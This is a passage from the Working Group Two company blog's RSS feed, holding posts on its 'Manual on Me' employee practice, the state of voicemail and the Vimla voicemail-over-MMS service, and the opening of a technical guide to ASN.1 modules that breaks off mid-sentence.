been spread across the company. Several hip hip hoorays and smiles around. People feel like wgtwo's identity is now represented. Some that were never interested before are now providing feedback and are inspired to write blog posts.</p><p>Our new website is a living, breathing machine telling our company's story one day at a time.</p><p><em>Overall, I want to say a special thanks to my little Senja Mae and my wife Sophia for chilling on the couch with me while I spent countless hours using Apple airplay to cast my computer screen on the tv while coding away.</em></p>]]></content:encoded>
            <category>website</category>
            <category>react</category>
        </item>
        <item>
            <title><![CDATA[Manual on Me: Matt Long]]></title>
            <link>https://www.wgtwo.com/jp/blog/manual-on-me-matt-long</link>
            <guid>manual-on-me-matt-long</guid>
            <pubDate>Tue, 08 Feb 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.]]></description>
            <content:encoded><![CDATA[<p>As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.</p><p>The responses varied.  Some were mildly positive, but most were very cynical since this sort of testing can be misused by bad management.  However, this got me thinking and, eventually, writing this post.</p><p>Let's look at the supervisor mentioned on Reddit and view their actions in a charitable light.  It is entirely probable that they only wanted to better understand and work with their new direct reports.  This is undoubtedly great!  However, a personality test is not a particularly useful tool for this -- people are too varied, and lives are too complicated.  This <a href="https://knowledge.wharton.upenn.edu/article/the-science-of-personality-understanding-yourself-and-those-around-you/" target="_blank" rel="noopener noreferrer">interview</a> with Brian Little, the author of "Me, Myself and Us: The Science of Personality and the Art of Well-Being," discusses some of the problems with these sorts of assessments.</p><p>And as an employee, who wants a supervisor that uses an impersonal online test to figure out the best way to work with someone?</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="our-process">Our Process<a class="hash-link" href="#our-process" title="Direct link to heading">​</a></h2><p>At <a href="https://www.wgtwo.com" target="_blank" rel="noopener noreferrer">Working Group Two</a>, we do things a little bit differently.  We follow a straightforward process of <a href="https://www.wgtwo.com/blog/were-all-grownups-here/" target="_blank" rel="noopener noreferrer">treating employees like grownups</a>.  I thought it might be worth talking about how we handle the "let's try to understand our employees" problem and share a public version of what I have shared inside the company.</p><p>The short answer to this is this: just ask.  Amazing!</p><p>When new employees start working with us, we ask them to fill out a "Manual on Me." Since we are a distributed company and everyone is <em>de-facto</em> remote, this manual serves two purposes: it is a bit of an icebreaker and a powerful communication tool.  Everyone in the company has a "Manual on Me," from the CEO and CTO to the most recent new hire.</p><p>As Professor Little notes: "Once you understand what a person's core projects are or even ask a person, 'How is it going, David?,' it puts us in a position where we can actually treat humans as humans.  That to me is going to pay enormous benefits in the long term."</p><p>Here's what I was asked to put into <em>my</em> manual:</p><ul><li>What I know about that people can ask me</li><li>How I think about things</li><li>Common mistakes I make in my interactions with others</li><li>My expectations from others</li><li>What frustrates me</li><li>How to reach out and get in touch with me</li><li>How to give me feedback</li></ul><p>Although nobody in the company remembers how this practice actually started, this is not a completely new idea.  I see that there are a few references to this concept around the internet, including at least one <a href="https://www.manualof.me" target="_blank" rel="noopener noreferrer">online version</a>.  Their <a href="https://www.manualof.me/about" target="_blank" rel="noopener noreferrer">about page</a> cites a few previous inspirations and sources for this "personal user manual."</p><p>So how does this solve the problem on Reddit?  Assuming the OP's new supervisor really wanted to know their employees, they could <em>just ask</em> and probably find out just as much (or more) than having everyone take the MBTI.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="my-manual-on-me">My "Manual on Me"<a class="hash-link" href="#my-manual-on-me" title="Direct link to heading">​</a></h2><p>So what does my "Manual on Me" look like?  Here is what I wrote in the summer of 2018:</p><div class="theme-admonition theme-admonition-note alert alert--secondary admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>Manual on Me</div><div class="admonitionContent_S0QG"><p><img loading="lazy" src="/jp/assets/images/mtl-grayscale-f68c6613dbdf0c21199e454c0b303400.png" width="200" height="200" class="img_ev3q"></p><p><strong>What I know something about:</strong></p><ul><li>I know a little bit about a lot of things.</li><li>Recently, I've been doing a lot of cloud infrastructure work, so that is freshest in my mind.</li><li>I've also had experience with development of embedded Java VMs, garbage collection, graphics drivers, distributed workflow systems, robotics, AI, machine learning, and autonomous ships.</li></ul><p><strong>How I think about things:</strong></p><ul><li>I like to challenge how things are done and find simpler solutions.  This often involves understanding why things are currently done the way they are.</li><li>I very much like to think about an end goal and develop solutions <em>towards</em> the goal.</li><li>While I like to think a little about the steps in the middle, I don't like planning them in great detail.</li></ul><p><strong>Common mistakes I make in my interaction with you:</strong></p><ul><li>Sometimes, I will offer possibilities and suggestions as a way of discussion -- sort of like the "rubber duck" development process.  This is not <em>meant</em> as a negative criticism but intended to continue the conversation and explore possibilities.  But I do understand how it can be interpreted in other ways.  Let me know if this is annoying!</li></ul><p><strong>My expectations to you:</strong></p><ul><li>I expect people to try, experiment, and learn.</li><li>I also hope that everyone feels comfortable speaking up and expressing their point of view and ideas.</li><li>If something is not clear, ask for clarification.</li></ul><p><strong>What frustrates me:</strong></p><ul><li>Bureaucracy, particularly rules that exist without an explanation of why the rule exists.</li><li>Broken software systems.  When tied with bureaucracy, these are often known as "Enterprise software."</li></ul><p><strong>How to reach out to me:</strong></p><ul><li>I prefer asynchronous messaging<ul><li>Work Slack is absolutely the easiest way to reach me</li><li>SMS is second-best</li></ul></li><li>Voice is also fine as long as it is a reasonable time or arranged through one of the async methods.</li></ul><p><strong>How to give me feedback:</strong></p><ul><li>I like feedback, and direct, actionable feedback is fantastic!</li><li>If it is serious, I like to have time to digest the feedback before I need to give a response, if possible.</li></ul></div></div><p>Most of this is still true, but maybe it is time for an update!</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-management-perspective">A management perspective<a class="hash-link" href="#a-management-perspective" title="Direct link to heading">​</a></h2><p>As a manager who likes to make sure my team is happy and enjoying their work (to the extent that I can do so), I really like these.</p><p>When talking to new colleagues, I have a great way to start conversations ("So, where have you been climbing recently?", "How're the corona regulations in Canada these days?", "What type of photography do you like to do?").</p><p>They also help with giving and receiving feedback.  Should I drop a note into Slack, then set up a video meeting?  How blunt should I be?  Should I expect to talk about the feedback immediately or schedule a follow-up meeting after they (or I) have had a chance to think?</p><p>But most importantly, we feel that the "Manual on Me" is a respectful, adult way to communicate preferences without trying to pigeonhole everyone into one of sixteen types.</p>]]></content:encoded>
            <category>trust</category>
            <category>culture</category>
            <category>startup</category>
            <category>manual-on-me</category>
        </item>
        <item>
            <title><![CDATA[Don't leave a message after the beep]]></title>
            <link>https://www.wgtwo.com/jp/blog/please-dont-leave-a-message-after-the-beep</link>
            <guid>please-dont-leave-a-message-after-the-beep</guid>
            <pubDate>Fri, 04 Feb 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.]]></description>
            <content:encoded><![CDATA[<p>Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.</p><p>“Please leave your message after the beep” - you’ve probably heard it a million times, especially if you were born before 1982. Or you’ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn’t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn’t know what else to say.</p><p>For many of us, those days are over. We just don’t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don’t even know if people who call me get to a voicemail system.</p><p>To others, voicemail is really crucial.</p><blockquote><p>“We see the importance of voicemail increasing or declining based on specific demographics,” says Luke Campbell, the CEO of <a href="https://www.vxt.co.nz" target="_blank" rel="noopener noreferrer">Vxt</a>, a communications technology company in New Zealand.</p></blockquote><p>Luke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name. To some, that might be a differentiator, to others a nuisance.</p><p>Besides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million?</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="a-vocal-assistant">A vocal assistant<a class="hash-link" href="#a-vocal-assistant" title="Direct link to heading">​</a></h3><p>Karel Bourgois paints a similar picture. He’s the CEO of <a href="https://www.voxist.com" target="_blank" rel="noopener noreferrer">Voxist</a>, a voicemail and messaging app, based in France. He’s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don’t like talking.</p><img loading="lazy" src="/img/blog/voicemail.jpeg" alt="Breaking up via voicemail" width="300" class="img_ev3q"><blockquote><p>“I see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,” Karel says.</p></blockquote><p>So voicemail systems continue to evolve. Users either don’t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders.</p><p>To Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel’s observations.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-routes-you-can-go-down">The routes you can go down<a class="hash-link" href="#the-routes-you-can-go-down" title="Direct link to heading">​</a></h3><p>If you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful.</p><p>Another route is to make the user experience simpler. To make it easier and faster to listen to voicemail.</p><p>That’s essentially what Working Group Two and the Swedish mobile operator challenger <a href="https://vimla.se" target="_blank" rel="noopener noreferrer">Vimla</a> did. In response to a regulatory challenge by the Swedish Post &amp; Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user’s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people’s voicemails (which PTS had set out to stop) and customers get a better messaging experience.</p><p>This simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two’s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network.</p><blockquote><p>“We genuinely think this is a better product for our customers,” says Viktor Georgsson, Head of Operations with Vimla.</p></blockquote><p>Other operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ask-yourself-four-questions">Ask yourself four questions...<a class="hash-link" href="#ask-yourself-four-questions" title="Direct link to heading">​</a></h3><p>At the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He’s in charge of the effort of developing the company’s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla’s solution took its inspiration.</p><p>You need to ask yourself four questions, Marius points out. First, is the product <strong>valuable</strong> to its users? Is it <strong>usable</strong> for them? Is it <strong>possible to build</strong>? And is it <strong>economically viable</strong>?</p><blockquote><p>“Voicemail is a powerful reminder that a product doesn’t need to be desired by everyone, but by someone,” Marius concludes.</p></blockquote>]]></content:encoded>
            <category>messaging</category>
            <category>voicemail</category>
            <category>api</category>
        </item>
        <item>
            <title><![CDATA[The specs behind the specs part 1]]></title>
            <link>https://www.wgtwo.com/jp/blog/the-specs-behind-the-specs-part-1</link>
            <guid>the-specs-behind-the-specs-part-1</guid>
            <pubDate>Tue, 11 Jan 2022 00:00:00 GMT</pubDate>
            <description><![CDATA["Abstract Syntax Notation One (ASN.1) is a standard interface]]></description>
            <content:encoded><![CDATA[<p>"Abstract Syntax Notation One (ASN.1) is a standard interface
description language for defining data structures that can be
serialized and deserialized in a cross-platform way." -
<a href="https://en.wikipedia.org/wiki/ASN.1" target="_blank" rel="noopener noreferrer">Wikipedia</a></p><h1>Introduction</h1><p>Today you'll read about a specific language used to describe many of
the messages in the telecom specifications. It will be a deep-dive
into technical parts, so I imagine you could just use the blog post
when you want to look up different parts without fully reading it.</p><p>In <strong>wgtwo</strong> we use this language for some specific telco
messages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP
and probably some more). They are defined directly in some of the
telecom specifications, and because of that it is possible to use them
to send messages between different telecom cores.</p><p>This will <em>probably</em> be a two piece blog post as there is another
interface describing language which is not ASN.1, and this is already
a very long post. The other specification is used in Diameter
dictionaries, but I'll spare those for now. It has already taken me
about half a year to finish up this article.</p><p>There might be some Erlang specific paragraphs here and there, but
this blog post is mainly about ASN.1 as a specification, which can be
used in any language supporting it.  For Erlang specifics I came
across <a href="https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479" target="_blank" rel="noopener noreferrer">this blog
post</a>
written by Viacheslav Katsuba, and because it is build into Erlang by
default I recommend the
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html" target="_blank" rel="noopener noreferrer">APIs</a>
as well.</p><p><strong>DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.</strong></p><h1>Abstract Syntax Notation One</h1><p>Abstract Syntax Notation One (ASN.1 for short) provides a
high level description of messages. It abstracts the language
implementations from the protocol design.</p><p>It was initially used by <a href="https://en.wikipedia.org/wiki/Open_Systems_Interconnection" target="_blank" rel="noopener noreferrer">Open Systems Interconnection
(OSI)</a> to
describe email messages but is used by many other applications
especially within telecommunications and cryptography.</p><p>You might have heard of similar such abstract syntax notations used
for interface definitions such as Google Protocol Buffers, or
Facebook's Apache Thrift, but those languages have not been managed by
a standardization organization, so the owning corporations could (in
theory) make breaking changes or change the license or even remove the
language definitions overnight.</p><p>Anyway, back to ASN.1</p><p>The first ASN.1 standardization came out 1984, and there have been
many improvements since, for instance with the 1994 update which added
extended functionality for telecommunication technologies.</p><p>"Long live ASN.1!" - Olivier Dubuisson from the <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson" target="_blank" rel="noopener noreferrer">best
book</a>
that I've read on the subject. (How many ASN.1 books are there you
might wonder? Actually there were <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html" target="_blank" rel="noopener noreferrer">more
books</a>
than I expected on the subject, but to make it perfectly clear: I did
only read the one.)</p><p>Off-topic but a bit of a fun fact I got from reading the book which I
didn't know about before is that 'little Endian' and 'big Endian',
which are used to denote if the bitstring should be read from leftmost
or rightmost bit, actually originates from the 1726 best-seller
<a href="https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm" target="_blank" rel="noopener noreferrer">Gulliver's
travels</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-how-and-why">The how and why<a class="hash-link" href="#the-how-and-why" title="Direct link to heading">​</a></h2><p>ASN.1 builds on the following ideas:</p><ul><li>Data structures to be transmitted should be described regardless of
programming language used transmitting or receiving them.</li><li>The notation should allow building complex data types from basic
types, and be able to do so recursively.</li><li>The notation must be formal to prevent ambiguities.</li></ul><p>That said, ASN.1 is not an abstract syntax in itself, but a language
to describe abstract syntaxes.</p><p>There are currently four main ASN.1 specifications (listed below), as
well as at least one specification per encoding rule (listed in the
<a href="#encodings">last section</a>).</p><table><thead><tr><th>ITU-T no</th><th>ASN.1 specifications</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.680" target="_blank" rel="noopener noreferrer">X.680</a></td><td>Abstract Syntax Notation One (ASN.1): Specification of basic notation</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.681" target="_blank" rel="noopener noreferrer">X.681</a></td><td>Abstract Syntax Notation One (ASN.1): Information object specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.682" target="_blank" rel="noopener noreferrer">X.682</a></td><td>Abstract Syntax Notation One (ASN.1): Constraint specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.683" target="_blank" rel="noopener noreferrer">X.683</a></td><td>Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications</td></tr></tbody></table><h1>Nitty gritty</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="modules">Modules<a class="hash-link" href="#modules" title="Direct link to heading">​</a></h2><p>The purpose of an ASN.1 module is to name a collection of types and/or
value definitions.</p><p>It consist of a module reference and an optional object identifier
together with the declaration of the <code>DEFINITIONS</code> type definition.
Note that even though the object identifier is optional, it is
considered bad practice to leave it out. The reason for it being
optional is for backward compatibility; it was not part of the
original ASN.1 specification.
The <code>DEFINITIONS</code> keyword usually comes together with the <code>BEGIN</code> and
<code>END</code> keywords so multiple definitions can be done. (What else is the
point of a module if not to make a collection...).</p><p>The Erlang ASN.1 compiler requires each module to be in a separate
file, but generally one ASN.1 file could contain many modules.  Usual
file endings are <code>.asn</code> and <code>.asn1</code>. One
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation" target="_blank" rel="noopener noreferrer">trick</a>
that can be used to circumvent this Erlang specific problem is to list
multiple ASN.1 files in a new file ending with <code>set.asn</code>.</p><p>The ASN.1 template for a module</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">ModuleReference ObjectIdentifier</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>as seen in an example</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(3) cap-operationcodes(53) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For information about the object identifier see the <a href="#object-identifier">types section</a></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="importing-from-other-modules">Importing from other modules<a class="hash-link" href="#importing-from-other-modules" title="Direct link to heading">​</a></h3><p>Importing types, values and other structures from other modules can be
done with the <code>IMPORTS</code> and <code>FROM</code> keywords in the beginning of the
module body.  The <code>IMPORTS</code> keyword ends with a single semicolon <code>;</code>,
and the different imported definitions are comma-separated.</p><p>The meaning of the optional <code>IMPLICIT TAGS</code> keywords I'll handle
<a href="#automatic-implicit-explicit-tags">later</a>.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Duration,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Integer4,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Interval,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LegID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ServiceKey</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(0) cs1-datatypes(2) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    BothwayThroughConnectionInd,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    CriticalityType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MiscCallInfo</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS2-datatypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">cs2(20) modules(0) in-cs2-datatypes(0) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">-- ...more imports...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">; -- IMPORTS end here</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END -- CAP-datatypes ends here --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">-- CAP-errortypes module starts here --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-errortypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-errortypes(51) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END -- CAP-errortypes ends here --</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The type definitions <code>Duration</code> and <code>LegID</code> above are imported from
<code>CS1-DataTypes</code> module, while <code>MiscCallInfo</code> comes from
the <code>CS2-datatypes</code> module.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="exporting-from-a-module">Exporting from a module<a class="hash-link" href="#exporting-from-a-module" title="Direct link to heading">​</a></h3><p>Exports from a module are done in a similar fashion.</p><p>If the <code>EXPORT</code> keyword is not used in a module, the ASN.1 compilers
should export all values and types from the module. It's the same as
specifying <code>EXPORTS ALL;</code>.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-GPRS-ReferenceNumber {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">umts-network(1) modules(3) cap-dialogueInformation(111) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">EXPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    id-CAP-GPRS-ReferenceNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    cAP-GPRS-ReferenceNumber-Abstract-Syntax;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Integer4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(0) cs1-datatypes(2) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="commenting">Commenting<a class="hash-link" href="#commenting" title="Direct link to heading">​</a></h3><p>As can be seen in the above example one can enter comments into the
ASN.1.  Comments starts with double dash <code>--</code> and ends with either a
